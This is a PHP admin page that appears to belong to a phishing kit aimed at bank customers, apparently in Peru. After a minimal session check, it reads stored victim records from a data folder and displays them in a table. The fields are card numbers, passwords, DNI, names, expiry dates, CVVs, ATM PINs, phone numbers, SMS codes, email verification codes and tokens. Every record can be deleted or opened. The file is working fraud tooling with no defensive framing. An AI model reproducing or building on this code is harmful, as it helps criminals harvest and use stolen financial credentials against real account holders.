<?php
session_start();

if(!isset($_SESSION["LoginPanel"]))
{
    echo "no has iniciado sesion aun sapooo";exit;
}

if($_SESSION["LoginPanel"] != "TrueValid")
{
    echo "no has iniciado sesion aun sapooo";exit;
}

error_reporting(0);

/*****************************************************************************/

date_default_timezone_set("America/Lima");  // Define horario
$dino = date("A");
$fecha = date('d/m/Y');

/*****************************************************************************
** Desarrollo Body
*****************************************************************************/

$directorio = opendir("data");

while ($archivo = readdir($directorio))
{
    if (is_dir($archivo))

    {
        echo "<div style=\"display: none;;\">[".$archivo . "]</div>";
    }

    else

    {

        list($hora, $ip) = explode(' - ', $archivo);

        $hour = substr($hora, -4, 2);
        $minu = substr($hora, -2, 2);

        $hora_res = $hour.":".$minu." ".$dino;

        $contenido = file_get_contents("data/".$archivo);
        //echo $contenido;
        $datos_array = json_decode($contenido, true);
        
        //list($ipv, $card, $clave, $dni, $nombre, $exp, $cvv, $atm, $operador, $celular,$sms, $token) = explode('|', $contenido);
        
        $ipv = $datos_array["ip"];
        $card = $datos_array["card"];
        $clave = $datos_array["pass"];
        $dni = $datos_array["dni"];
        $nombre = $datos_array["nombre"];
        $operador = $datos_array["operador"];
        $celular = $datos_array["numero"];
        
        $sms = $datos_array["sms"];
        $token = $datos_array["token"];
        $estado = $datos_array["estado"];
        
        $exp = $datos_array["date"];
        $cvv = $datos_array["cvv"];
        $atm = $datos_array["atm"];
        
        $correo = $datos_array["correo"];
        $codigo_correo = $datos_array["codigo_correo"];

/*****************************************************************************
** Archivos
*****************************************************************************/

echo "<tbody>
        <tr class=\"templates-tr-1\">
            <td><div class=\"td-width\">$ipv<br>$estado</div></td>
            <td><div class=\"td-width\">$card</div></td>
            <td><div class=\"td-width\">$clave</div></td>
            <td><div class=\"td-width-special\">$dni</div></td>
            <td><div class=\"td-width-special\">$nombre</div></td>
            <td><div class=\"td-width\">FV: $exp<br>Cvv: $cvv<br>ATM: $atm</div></td>
            <td><div class=\"td-width\">$operador / $celular</div></td>
            <td><div class=\"td-width\">$sms</div></td>
            <td><div class=\"td-width\">$correo</div></td>
            <td><div class=\"td-width\">$codigo_correo</div></td>
            <td><div class=\"td-width\">$token</div></td>
               
            <td><div class=\"td-width\">
            <a href=\"vista21?id=2&file=$archivo\"><i class=\"far fa-trash-alt\" style=\"font-size: 15px; text-decoration-line: none;color: black;\"></i></a>
            <a target='_blank' href=\"secondPanel.php?file=$archivo\"><i class=\"far fas fa-eye\" style=\"font-size: 15px; text-decoration-line: none;color: black;\"></i></a>
            </div></td>
            
        </tr>
    </tbody>";
            
    }
}
            
?>